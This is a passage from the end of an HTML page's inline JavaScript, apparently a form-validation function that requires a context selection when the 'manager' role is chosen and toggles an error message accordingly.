            const roleSelect = document.getElementById('roleSelect');
            const contextSelect = document.getElementById('contextSelect');
            const contextError = document.getElementById('contextError');
            
            if (roleSelect.value === 'manager' && !contextSelect.value) {
                contextError.style.display = 'block';
                contextSelect.focus();
                return false;
            }
            
            contextError.style.display = 'none';
            return true;
        }
    </script>
</body>
</html>
